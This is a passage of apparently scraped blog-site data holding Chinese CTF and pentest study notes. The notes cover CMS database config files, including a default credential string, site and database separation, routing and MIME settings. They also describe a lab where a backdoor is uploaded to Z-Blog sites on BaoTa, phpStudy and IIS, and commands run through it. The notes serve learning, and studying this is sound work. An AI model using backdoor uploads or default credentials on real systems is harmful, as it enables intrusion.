**自写：**比如自己的博客\n\n有些源码可下载，但看不到是什么东西，如果能看到代码就是白盒测试、也就是代码审计，而碰到了加密或者是语言特性决定源码不可见的情况，就比如.net的代码就要进行反编译。\n\n大型企业基本不会用开源的代码，安全性太低。或者商业的代码，不需要找别人开发。\n\n> 以下是一些常用的开源协议：\n> \n> \n>  * # gpl 协议\n>    \n>    * 简介：由自由软件基金会制定，旨在保证软件的开源性和用户的自由。有 gpl2.0 和 gpl3.0 等版本，gpl3.0 在用户专利保护和 drm 限制等方面有所更新.\n>    * 特点：使用该协议的软件，其源代码及衍生作品都必须开源，并以相同协议发布。允许用户自由运行、复制、修改和分发软件，但不允许将开源软件私有化用于商业发售.\n>    \n>    \n>    # lgpl 协议\n>    \n>    * 简介：是 gpl 的变种，主要用于类库，被商业软件开发商广泛支持.\n>    * 特点：允许商业软件通过类库引用方式使用 lgpl 类库而无需开源商业软件代码，但如果修改了 lgpl 协议的代码，修改后的代码仍需开源.\n>    \n>    \n>    # bsd 协议\n>    \n>    * 简介：分为 bsd 2-clause 和 bsd 3-clause 两种，给予使用者很大自由.\n>    * 特点：使用者可自由使用、修改和再发布代码，无论是开源还是专有软件均可。发布时，若包含源代码需带原 bsd 协议，若仅发布二进制类库 / 软件，则需在文档和版权声明中包含原协议，且不可用作者 / 机构名字和原产品名做市场推广.\n>    \n>    \n>    # apache 协议\n>    \n>    * 简介：著名的非盈利开源组织 apache 采用的协议，和 bsd 类似，对商业应用友好.\n>    * 特点：允许使用者修改和再发布代码作为开源或商业产品，使用时需给用户一份协议，修改代码要在被修改文件中说明，延伸代码中需带有原协议等声明，若发布产品包含 notice 文件，其中也要带有该协议.\n>    \n>    \n>    # mpl 协议\n>    \n>    * 简介：最初由 netscape 的 mozilla 小组设计，平衡了开发者对源代码的需求和利益.\n>    * 特点：要求对经 mpl 许可证发布的源代码的修改以 mpl 许可证方式再许可，但允许企业在已有源代码库上加接口，接口程序源代码以 mpl 许可证对外许可，库中其他源代码则无需强制对外许可.\n>    \n>    \n>    # mit 协议\n>    \n>    * 简介：是一种非常宽松的许可协议，作者仅保留版权.\n>    * 特点：允许任何人进行个人或商业使用、复制、分发和修改，唯一要求是在发行版中包含原许可协议声明",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"2024124CTF学习笔记21",frontmatter:{title:"2024124CTF学习笔记21",date:"2024-12-24T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-24-CTFLearn.html",relativePath:"views/numerology/2024-12-24-CTFLearn.md",key:"v-1e951c3e",path:"/views/numerology/2024-12-24-CTFLearn.html",headers:[{level:2,title:"数据库：",slug:"数据库",normalizedTitle:"数据库：",charIndex:167},{level:3,title:"Z-Blog 简介",slug:"z-blog-简介",normalizedTitle:"z-blog 简介",charIndex:177},{level:3,title:"站库分离",slug:"站库分离",normalizedTitle:"站库分离",charIndex:49},{level:3,title:"HdhCms",slug:"hdhcms",normalizedTitle:"hdhcms",charIndex:202}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第36天</p>\n<p>Web应用&amp;架构搭建&amp;站库分离&amp;路由访问&amp;配置受限&amp;DNS解析</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"数据库： Z-Blog 简介 站库分离 HdhCms",content:'从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第36天\n\nWeb应用&架构搭建&站库分离&路由访问&配置受限&DNS解析\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * 数据库：\n   * Z-Blog 简介\n   * 站库分离\n   * HdhCms\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第19章：基础入门-Web应用&架构搭建&站库分离&路由访问&配置受限&DNS解析\n\n\n# 数据库：\n\n这里示例用的z-blog是Access数据库，这种数据库是没有账号密码的，\n\n\n> # Z-Blog 简介\n> \n> Z-Blog 由专业团队开发。操作简便，新手也能快速上手搭建自己的博客。具备出色的灵活性和扩展性，支持多语言，方便全球用户使用，同时在 SEO 优化方面表现良好，有助于提升博客的搜索排名。\n> \n> 其核心功能丰富，包括便捷的文章管理（如分类、标签设置）、评论系统、用户管理和统计分析等，能满足博主的基本需求。而且，拥有众多的主题和插件，用户可以轻松更换博客风格，或者通过插件增加如社交分享、安全防护等功能.\n\n我们在学习源码结构的时候，需要注意各种名称，比如data或者options等，以下是access数据库的c_options.asp的内容（太古老了这技术）\n\nDim ZC_DATABASE_PATH\nZC_DATABASE_PATH="zb_users\\data\\#%20a7ab2ad93abf.mdb" \n\nDim ZC_MSSQL_DATABASE \nZC_MSSQL_DATABASE="" \n\nDim ZC_MSSQL_USERNAME \nZC_MSSQL_USERNAME=""\n\nDim ZC_MSSQL_PASSWORD\nZC_MSSQL_PASSWORD=""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n这种数据库可以用office打开，能直接输入数据，数据保存的文件是一个office能打开的文件。\n\n这种方式安全性几乎为0，管理员密码也展示在表格中，我们观察上边的数据库配置文件，这里我们用的是ZC_DATABASE_PATH，所以是Access数据库，我们也可以选择用MSSQL数据库，也就是下方需要设置账号密码的数据库\n\n\n# 站库分离\n\n不分离是指网站源码和数据库放在一起，分离是指网站和源码不在一起。\n\n我们可以新开一台服务器，去装数据库，用来专门放数据。这就是站库分离。\n\n\n\n虽然技术很老，但老师用心良苦，很不错，这个步骤能打牢我们的基础，不过就是有点太基础了。\n\n这里视频中用了另外一套源码，用的是hdhcms\n\n\n> # HdhCms\n> \n> HdhCms是一款轻量级的专注于企业网站建设、企业办公管理与企业客户管理的内容管理系统，开发脚本为ASP.Net(C#)，数据库支持MSSQL、SQLITE数据库，默认下载为SQLITE数据库版本。\n> \n> HDH建站管理系统(HdhCms)此套系统是何冬华先生独立开发的一款基于PC网站+手机网站+微信小程序+第三方平台接入（微信公众号）的多合一集自助建站管理、简易办公管理与客户关系管理于一体的CMS系统，开发脚本为ASP.Net(C#)，数据库同步兼容（MSSQL），目前也是ASP.NET(c#)语言所开发的多合一网站建设方面比较完善的产品之一。\n\n这里我们找到源码里的数据库配置文件HdhApp.config\n\n<add name="HdhSqlConnStr" connectionString="user id=HdhCms;password=hdhcms123456;initial catalog=Hywzxt;data source=localhost"/>\n\n\n1\n\n\n以上配置信息是数据库的配置信息，包括数据库名、用户名、密码等。\n\n如果我们删掉关联的数据库的话，对应的网站会报错数据库连接问题',normalizedContent:'从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第36天\n\nweb应用&架构搭建&站库分离&路由访问&配置受限&dns解析\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * 数据库：\n   * z-blog 简介\n   * 站库分离\n   * hdhcms\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第19章：基础入门-web应用&架构搭建&站库分离&路由访问&配置受限&dns解析\n\n\n# 数据库：\n\n这里示例用的z-blog是access数据库，这种数据库是没有账号密码的，\n\n\n> # z-blog 简介\n> \n> z-blog 由专业团队开发。操作简便，新手也能快速上手搭建自己的博客。具备出色的灵活性和扩展性，支持多语言，方便全球用户使用，同时在 seo 优化方面表现良好，有助于提升博客的搜索排名。\n> \n> 其核心功能丰富，包括便捷的文章管理（如分类、标签设置）、评论系统、用户管理和统计分析等，能满足博主的基本需求。而且，拥有众多的主题和插件，用户可以轻松更换博客风格，或者通过插件增加如社交分享、安全防护等功能.\n\n我们在学习源码结构的时候，需要注意各种名称，比如data或者options等，以下是access数据库的c_options.asp的内容（太古老了这技术）\n\ndim zc_database_path\nzc_database_path="zb_users\\data\\#%20a7ab2ad93abf.mdb" \n\ndim zc_mssql_database \nzc_mssql_database="" \n\ndim zc_mssql_username \nzc_mssql_username=""\n\ndim zc_mssql_password\nzc_mssql_password=""\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n这种数据库可以用office打开，能直接输入数据，数据保存的文件是一个office能打开的文件。\n\n这种方式安全性几乎为0，管理员密码也展示在表格中，我们观察上边的数据库配置文件，这里我们用的是zc_database_path，所以是access数据库，我们也可以选择用mssql数据库，也就是下方需要设置账号密码的数据库\n\n\n# 站库分离\n\n不分离是指网站源码和数据库放在一起，分离是指网站和源码不在一起。\n\n我们可以新开一台服务器，去装数据库，用来专门放数据。这就是站库分离。\n\n\n\n虽然技术很老，但老师用心良苦，很不错，这个步骤能打牢我们的基础，不过就是有点太基础了。\n\n这里视频中用了另外一套源码，用的是hdhcms\n\n\n> # hdhcms\n> \n> hdhcms是一款轻量级的专注于企业网站建设、企业办公管理与企业客户管理的内容管理系统，开发脚本为asp.net(c#)，数据库支持mssql、sqlite数据库，默认下载为sqlite数据库版本。\n> \n> hdh建站管理系统(hdhcms)此套系统是何冬华先生独立开发的一款基于pc网站+手机网站+微信小程序+第三方平台接入（微信公众号）的多合一集自助建站管理、简易办公管理与客户关系管理于一体的cms系统，开发脚本为asp.net(c#)，数据库同步兼容（mssql），目前也是asp.net(c#)语言所开发的多合一网站建设方面比较完善的产品之一。\n\n这里我们找到源码里的数据库配置文件hdhapp.config\n\n<add name="hdhsqlconnstr" connectionstring="user id=hdhcms;password=hdhcms123456;initial catalog=hywzxt;data source=localhost"/>\n\n\n1\n\n\n以上配置信息是数据库的配置信息，包括数据库名、用户名、密码等。\n\n如果我们删掉关联的数据库的话，对应的网站会报错数据库连接问题',charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"2024125CTF学习笔记22",frontmatter:{title:"2024125CTF学习笔记22",date:"2024-12-25T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-25-CTFLearn.html",relativePath:"views/numerology/2024-12-25-CTFLearn.md",key:"v-bc764880",path:"/views/numerology/2024-12-25-CTFLearn.html",headers:[{level:2,title:"数据库：",slug:"数据库",normalizedTitle:"数据库：",charIndex:167},{level:3,title:"情况对比",slug:"情况对比",normalizedTitle:"情况对比",charIndex:177},{level:2,title:"认识目录",slug:"认识目录",normalizedTitle:"认识目录",charIndex:185},{level:2,title:"路由访问",slug:"路由访问",normalizedTitle:"路由访问",charIndex:54},{level:3,title:"常规方式：",slug:"常规方式",normalizedTitle:"常规方式：",charIndex:203},{level:3,title:"非常规模式-路由访问",slug:"非常规模式-路由访问",normalizedTitle:"非常规模式-路由访问",charIndex:214},{level:2,title:"解析规则",slug:"解析规则",normalizedTitle:"解析规则",charIndex:228},{level:2,title:"整体总结",slug:"整体总结",normalizedTitle:"整体总结",charIndex:236}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第37天</p>\n<p>Web应用&amp;架构搭建&amp;站库分离&amp;路由访问&amp;配置受限&amp;DNS解析</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"数据库： 情况对比 认识目录 路由访问 常规方式： 非常规模式-路由访问 解析规则 整体总结",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第37天\n\nWeb应用&架构搭建&站库分离&路由访问&配置受限&DNS解析\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * 数据库：\n   * 情况对比\n * 认识目录\n * 路由访问\n   * 常规方式：\n   * 非常规模式-路由访问\n * 解析规则\n * 整体总结\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第19章：基础入门-Web应用&架构搭建&站库分离&路由访问&配置受限&DNS解析\n\n\n# 数据库：\n\n除昨天提到到的方法外，还有云数据库，如阿里云的云数据库RDS、腾讯云的云原生MySQL等。\n\n这种方式对比昨天的方式不需要操作系统，能直接租成品的云数据库\n\n\n\n\n# 情况对比\n\n 1. 如果我们是将应用和数据库都放到本地，我们拿到权限的话，可以拿到所有权限\n 2. 如果我们应用和数据库不在同一台服务器，也就是站库分离的形式，就不一定能拿到数据，因为数据库有外联特性或者绑定特性，即便拿到了账号密码也不一定能连接上。\n 3. 如果用云上的数据库，安全系数更高，登录方式不再是传统的账号密码（比如阿里云的key），还可能有一些其他的绑定，可以限制某些IP的访问，只有应用可以访问。\n\n现在的安全趋势和传统方式已经大不相同，已经不能用传统的眼光去看待现在的形势。\n\n有些产品现在购买网站域名+云服务+云数据库+云存储空间就能搭建一个完整、安全的产品\n\n这里的云存储空间比如有阿里云的OSS资源，专门用来存储用户数据，比如音频、图片等，传统的方式是上传到应用目录下，存储到网站的目录下，变为存储到OSS资源中后，我们上传漏洞不再可用，后门上传后没有任何作用。\n\n我们大部分的漏洞都是传统的搭建模式，现在技术的快速迭代导致的一些传统漏洞不再可用，比如数据库采用云数据库、头像上传到OSS对象中，很多漏洞就不用去考虑了，因为这些漏洞已不复存在。\n\n所以我们要学习信息搜集，搜集的目标就是判断应用是不是符合我们漏洞利用的类型，搜集到以后才能进入后面的步骤。\n\n\n# 认识目录\n\n我们在见到源码的结构、目录后，需要根据结构、目录判断这些文件夹的作用，我们以hdhcms的源码目录举例：\n\nadmin --管理员、后台目录\nbin --执行程序\ndatabase --数据相关\nimage --图片相关\njs --前端JavaScript相关\nmember --会员\ntemplate --模版\nupfiles --文件上传\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 路由访问\n\n\n# 常规方式：\n\n视频中服务器上搭建的是z-blog的应用，在post文件下新建一个1.txt的文件，文件内容不限。\n\n我们在访问时，可以直接访问以下地址就能得到该文件http://xiaosedi.fun/post/1.txt，这种方式就是路由访问。\n\n因为我们在IIS管理器中绑定的地址就是绑定目录到z-blog这个文件夹\n\n\n# 非常规模式-路由访问\n\n一般常见于mvc类源码，比如python、java等。\n\n这种应用使用刚才的常规方式访问已经不可行了，会报404未找到的状态码。\n\n以后可能碰到网站源码和网站url对应不上的问题，这就是因为路由配置\n\n\n# 解析规则\n\n在IIS管理器中，有MIME类型设置，这就是为什么有些网站访问jsp文件是下载，有些网站是执行，就与这个设置有关\n\n\n\n从安全的角度考虑，如果添加一个asp的拓展名，对应的MIME类型是png，这时上传asp后，会被当成png展示，就没有脚本的作用了。\n\n在linux中，我们在nginx中找到nginx.conf可以设置mime相关内容\n\n   http {\n       types {\n           application/json json;\n           text/html html;\n           text/css css;\n           image/png png;\n           # 可以根据需要添加更多的MIME类型\n       }\n       # 其他http块内的配置\n   }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 整体总结\n\n",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第37天\n\nweb应用&架构搭建&站库分离&路由访问&配置受限&dns解析\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * 数据库：\n   * 情况对比\n * 认识目录\n * 路由访问\n   * 常规方式：\n   * 非常规模式-路由访问\n * 解析规则\n * 整体总结\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第19章：基础入门-web应用&架构搭建&站库分离&路由访问&配置受限&dns解析\n\n\n# 数据库：\n\n除昨天提到到的方法外，还有云数据库，如阿里云的云数据库rds、腾讯云的云原生mysql等。\n\n这种方式对比昨天的方式不需要操作系统，能直接租成品的云数据库\n\n\n\n\n# 情况对比\n\n 1. 如果我们是将应用和数据库都放到本地，我们拿到权限的话，可以拿到所有权限\n 2. 如果我们应用和数据库不在同一台服务器，也就是站库分离的形式，就不一定能拿到数据，因为数据库有外联特性或者绑定特性，即便拿到了账号密码也不一定能连接上。\n 3. 如果用云上的数据库，安全系数更高，登录方式不再是传统的账号密码（比如阿里云的key），还可能有一些其他的绑定，可以限制某些ip的访问，只有应用可以访问。\n\n现在的安全趋势和传统方式已经大不相同，已经不能用传统的眼光去看待现在的形势。\n\n有些产品现在购买网站域名+云服务+云数据库+云存储空间就能搭建一个完整、安全的产品\n\n这里的云存储空间比如有阿里云的oss资源，专门用来存储用户数据，比如音频、图片等，传统的方式是上传到应用目录下，存储到网站的目录下，变为存储到oss资源中后，我们上传漏洞不再可用，后门上传后没有任何作用。\n\n我们大部分的漏洞都是传统的搭建模式，现在技术的快速迭代导致的一些传统漏洞不再可用，比如数据库采用云数据库、头像上传到oss对象中，很多漏洞就不用去考虑了，因为这些漏洞已不复存在。\n\n所以我们要学习信息搜集，搜集的目标就是判断应用是不是符合我们漏洞利用的类型，搜集到以后才能进入后面的步骤。\n\n\n# 认识目录\n\n我们在见到源码的结构、目录后，需要根据结构、目录判断这些文件夹的作用，我们以hdhcms的源码目录举例：\n\nadmin --管理员、后台目录\nbin --执行程序\ndatabase --数据相关\nimage --图片相关\njs --前端javascript相关\nmember --会员\ntemplate --模版\nupfiles --文件上传\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n\n# 路由访问\n\n\n# 常规方式：\n\n视频中服务器上搭建的是z-blog的应用，在post文件下新建一个1.txt的文件，文件内容不限。\n\n我们在访问时，可以直接访问以下地址就能得到该文件http://xiaosedi.fun/post/1.txt，这种方式就是路由访问。\n\n因为我们在iis管理器中绑定的地址就是绑定目录到z-blog这个文件夹\n\n\n# 非常规模式-路由访问\n\n一般常见于mvc类源码，比如python、java等。\n\n这种应用使用刚才的常规方式访问已经不可行了，会报404未找到的状态码。\n\n以后可能碰到网站源码和网站url对应不上的问题，这就是因为路由配置\n\n\n# 解析规则\n\n在iis管理器中，有mime类型设置，这就是为什么有些网站访问jsp文件是下载，有些网站是执行，就与这个设置有关\n\n\n\n从安全的角度考虑，如果添加一个asp的拓展名，对应的mime类型是png，这时上传asp后，会被当成png展示，就没有脚本的作用了。\n\n在linux中，我们在nginx中找到nginx.conf可以设置mime相关内容\n\n   http {\n       types {\n           application/json json;\n           text/html html;\n           text/css css;\n           image/png png;\n           # 可以根据需要添加更多的mime类型\n       }\n       # 其他http块内的配置\n   }\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n\n# 整体总结\n\n",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"2024128CTF学习笔记24",frontmatter:{title:"2024128CTF学习笔记24",date:"2024-12-28T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-28-CTFLearn.html",relativePath:"views/numerology/2024-12-28-CTFLearn.md",key:"v-2b541a46",path:"/views/numerology/2024-12-28-CTFLearn.html",headers:[{level:2,title:"模拟攻击集成软件站：",slug:"模拟攻击集成软件站",normalizedTitle:"模拟攻击集成软件站：",charIndex:169},{level:3,title:"集成搭建-宝塔面板",slug:"集成搭建-宝塔面板",normalizedTitle:"集成搭建-宝塔面板",charIndex:185},{level:3,title:"集成搭建-phpStudy",slug:"集成搭建-phpstudy",normalizedTitle:"集成搭建-phpstudy",charIndex:200},{level:3,title:"手动传统搭建-iis管理器（微软Web服务器）",slug:"手动传统搭建-iis管理器-微软web服务器",normalizedTitle:"手动传统搭建-iis管理器（微软web服务器）",charIndex:219},{level:3,title:"特点总结",slug:"特点总结",normalizedTitle:"特点总结",charIndex:248},{level:3,title:"造成差异的原因",slug:"造成差异的原因",normalizedTitle:"造成差异的原因",charIndex:258}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第40天</p>\n<p>Web架构&amp;前后端分离站&amp;Docker容器站&amp;集成软件站&amp;建站分配</p>\n<p>发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。</p>\n<p>此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。</p>\n<p><div class="table-of-contents"><ul></ul></div></p>\n<ul>\n<li>小迪安全视频地址【<RouterLink to="/views/numerology/[https://www.bilibili.com/video/BV123yAYMEwb/">🔗传送门</RouterLink>】</li>\n</ul>\n',headersStr:"模拟攻击集成软件站： 集成搭建-宝塔面板 集成搭建-phpStudy 手动传统搭建-iis管理器（微软Web服务器） 特点总结 造成差异的原因",content:"从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第40天\n\nWeb架构&前后端分离站&Docker容器站&集成软件站&建站分配\n\n发现单纯学习CTF没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种CTF比赛，或者是每天练习CTF赛题，理论与实践相结合。\n\n\n\n * 模拟攻击集成软件站：\n   * 集成搭建-宝塔面板\n   * 集成搭建-phpStudy\n   * 手动传统搭建-iis管理器（微软Web服务器）\n   * 特点总结\n   * 造成差异的原因\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第20章：基础入门-Web架构&前后端分离站&Docker容器站&集成软件站&建站分配\n\n\n# 模拟攻击集成软件站：\n\n\n# 集成搭建-宝塔面板\n\n周五出去吃饭，周六出门，都没来得及学习，太罪恶了。\n\n视频中用宝塔面板搭建了zblog的博客网站，我们附上【宝塔面板官网】、【zblog官网】\n\n视频中用到的是“狐狸的工具箱”，这里附上【下载链接】，压缩包解压密码xiaodisec\n\n利用后门进行命令执行。\n\n\n\n图中，我们可以看到一句话\n\nnone of proc_open/passthru/shell_exec/exec/exec/popen/COM/runshellshock/pcntl_exec is available\n\n常规搭建的时候是可以执行命令的，但宝塔搭建的时候，连最基本的whoami都无法执行\n\n此外，我们用工具查看目录的时候，正常的子文件夹可以看到，但是wwwroot目录点不开，仅仅只能看到当前的网站的目录，其他目录是看不到的。\n\n\n\n这个提示Path Net Found Or No Permission的意思是路径没有发现或没有权限\n\n通过这个测试，我们可以明白，宝塔自动帮我们做了一些目录权限的设置。\n\n相反的，常规搭建的时候，如果没有额外做设置的情况下，一般是可以进行命令执行和文件其他路径读取的。\n\n在开始设计的时候是没有这样的限制的，这个限制是在宝塔的逐渐发展中完善、强化的。\n\n\n# 集成搭建-phpStudy\n\n在宝塔面板的前身，也就是phpStudy中，就是没有这些限制的。这里附上【phpStudy官网】\n\n在外网中访问到我们用phpStudy部署好的zblog，使用和刚才同样的后门。\n\n\n\n这时我们执行了whoami命令，得到的结果是administrator\n\n这时候发现是能命令执行的，并且文件目录也是可以看到的。\n\n\n# 手动传统搭建-iis管理器（微软Web服务器）\n\n这里附上【iis管理器的安装教程】\n\n我们使用iis管理器启动的时候，发现被占用，我么改了端口后重启，重新搭建好一个网站zblog，并上传后门\n\n用后门工具连接后门，发现是可以看到上级目录的，但其他目录不可以。\n\n命令执行方面，部分命令可以执行，部分不可以执行。\n\n\n\n\n# 特点总结\n\n宝塔搭建的特点：\n\n 1. 文件管理 锁定目录\n 2. 命令执行 无法执行\n\nphpStudy搭建的特点：\n\n 1. 文件管理 未锁定目录\n\n 2. 命令执行 可以执行\n    \n    whoami获取用户权限的执行结果是：izsjxymy4bzovoz\\administrator\n\n手动搭建的iis：\n\n 1. 文件管理 可以查看子目录 不可以查看其他目录\n\n 2. 命令执行 可以执行部分命令\n    \n    whoami获取用户权限的执行结果是：iis apppool\\defaultapppool\n\n\n# 造成差异的原因\n\n不同的工具搭建出来的东西不同，造成这种情况的原因是：\n\n 1. 宝塔初期是和phpStudy是一样的，都不够安全，在用户量逐渐增多后，逐渐注重安全，开始在宝塔的内核做更改，防止被侵入后文件直接丢失、修改的情况\n 2. phpSutdy被宝塔面板抢占用户市场以后，安全方面没有发展起来，造成的安全漏洞，但phpStudy也有防护，在创建网站的时候，是可以配置安全设置，但一般默认是全部关闭的。\n 3. whoami的结果不同的原因是iis是系统自带的，phpSutdy是自行安装的，是用administrator安装，继承了它的权限。",normalizedContent:"从0开始学习ctf，了解ctf基本规则、方法，这是开始打卡学习的第40天\n\nweb架构&前后端分离站&docker容器站&集成软件站&建站分配\n\n发现单纯学习ctf没有一个系统完整的课程，所以准备学小迪安全的渗透测试课程，希望能打一个好基础。\n\n此外，还应该多参加各种ctf比赛，或者是每天练习ctf赛题，理论与实践相结合。\n\n\n\n * 模拟攻击集成软件站：\n   * 集成搭建-宝塔面板\n   * 集成搭建-phpstudy\n   * 手动传统搭建-iis管理器（微软web服务器）\n   * 特点总结\n   * 造成差异的原因\n\n\n\n * 小迪安全视频地址【🔗传送门】\n\n\n# 第20章：基础入门-web架构&前后端分离站&docker容器站&集成软件站&建站分配\n\n\n# 模拟攻击集成软件站：\n\n\n# 集成搭建-宝塔面板\n\n周五出去吃饭，周六出门，都没来得及学习，太罪恶了。\n\n视频中用宝塔面板搭建了zblog的博客网站，我们附上【宝塔面板官网】、【zblog官网】\n\n视频中用到的是“狐狸的工具箱”，这里附上【下载链接】，压缩包解压密码xiaodisec\n\n利用后门进行命令执行。\n\n\n\n图中，我们可以看到一句话\n\nnone of proc_open/passthru/shell_exec/exec/exec/popen/com/runshellshock/pcntl_exec is available\n\n常规搭建的时候是可以执行命令的，但宝塔搭建的时候，连最基本的whoami都无法执行\n\n此外，我们用工具查看目录的时候，正常的子文件夹可以看到，但是wwwroot目录点不开，仅仅只能看到当前的网站的目录，其他目录是看不到的。\n\n\n\n这个提示path net found or no permission的意思是路径没有发现或没有权限\n\n通过这个测试，我们可以明白，宝塔自动帮我们做了一些目录权限的设置。\n\n相反的，常规搭建的时候，如果没有额外做设置的情况下，一般是可以进行命令执行和文件其他路径读取的。\n\n在开始设计的时候是没有这样的限制的，这个限制是在宝塔的逐渐发展中完善、强化的。\n\n\n# 集成搭建-phpstudy\n\n在宝塔面板的前身，也就是phpstudy中，就是没有这些限制的。这里附上【phpstudy官网】\n\n在外网中访问到我们用phpstudy部署好的zblog，使用和刚才同样的后门。\n\n\n\n这时我们执行了whoami命令，得到的结果是administrator\n\n这时候发现是能命令执行的，并且文件目录也是可以看到的。\n\n\n# 手动传统搭建-iis管理器（微软web服务器）\n\n这里附上【iis管理器的安装教程】\n\n我们使用iis管理器启动的时候，发现被占用，我么改了端口后重启，重新搭建好一个网站zblog，并上传后门\n\n用后门工具连接后门，发现是可以看到上级目录的，但其他目录不可以。\n\n命令执行方面，部分命令可以执行，部分不可以执行。\n\n\n\n\n# 特点总结\n\n宝塔搭建的特点：\n\n 1. 文件管理 锁定目录\n 2. 命令执行 无法执行\n\nphpstudy搭建的特点：\n\n 1. 文件管理 未锁定目录\n\n 2. 命令执行 可以执行\n    \n    whoami获取用户权限的执行结果是：izsjxymy4bzovoz\\administrator\n\n手动搭建的iis：\n\n 1. 文件管理 可以查看子目录 不可以查看其他目录\n\n 2. 命令执行 可以执行部分命令\n    \n    whoami获取用户权限的执行结果是：iis apppool\\defaultapppool\n\n\n# 造成差异的原因\n\n不同的工具搭建出来的东西不同，造成这种情况的原因是：\n\n 1. 宝塔初期是和phpstudy是一样的，都不够安全，在用户量逐渐增多后，逐渐注重安全，开始在宝塔的内核做更改，防止被侵入后文件直接丢失、修改的情况\n 2. phpsutdy被宝塔面板抢占用户市场以后，安全方面没有发展起来，造成的安全漏洞，但phpstudy也有防护，在创建网站的时候，是可以配置安全设置，但一般默认是全部关闭的。\n 3. whoami的结果不同的原因是iis是系统自带的，phpsutdy是自行安装的，是用administrator安装，继承了它的权限。",charsets:{cjk:!0},lastUpdated:"2025/01/09, 22:57:46",lastUpdatedTimestamp:1736434666e3},{title:"2024126CTF学习笔记23",frontmatter:{title:"2024126CTF学习笔记23",date:"2024-12-26T00:00:00.000Z",tags:["CTF","CTFLearn"],categories:["命理学 Numerology"],isShowComments:!0,publish:!0},regularPath:"/views/numerology/2024-12-26-CTFLearn.html",relativePath:"views/numerology/2024-12-26-CTFLearn.md",key:"v-24f49b42",path:"/views/numerology/2024-12-26-CTFLearn.html",headers:[{level:2,title:"网站架构：",slug:"网站架构",normalizedTitle:"网站架构：",charIndex:169},{level:3,title:"上节课内容",slug:"上节课内容",normalizedTitle:"上节课内容",charIndex:180},{level:3,title:"常规化搭建",slug:"常规化搭建",normalizedTitle:"常规化搭建",charIndex:191},{level:3,title:"站库分离",slug:"站库分离",normalizedTitle:"站库分离",charIndex:202},{level:2,title:"前后端分离",slug:"前后端分离",normalizedTitle:"前后端分离",charIndex:44},{level:2,title:"软件式搭建网站/集成化环境",slug:"软件式搭建网站-集成化环境",normalizedTitle:"软件式搭建网站/集成化环境",charIndex:219}],excerpt:'<Boxx/>\n<p>从0开始学习CTF，了解CTF基本规则、方法，这是开始打卡学习的第38天</p>\n<p>Web架构&amp;前后端分离站&amp;Docker容器站&amp;集成软件站&amp;建站分配</p>\n<p>发现单纯学习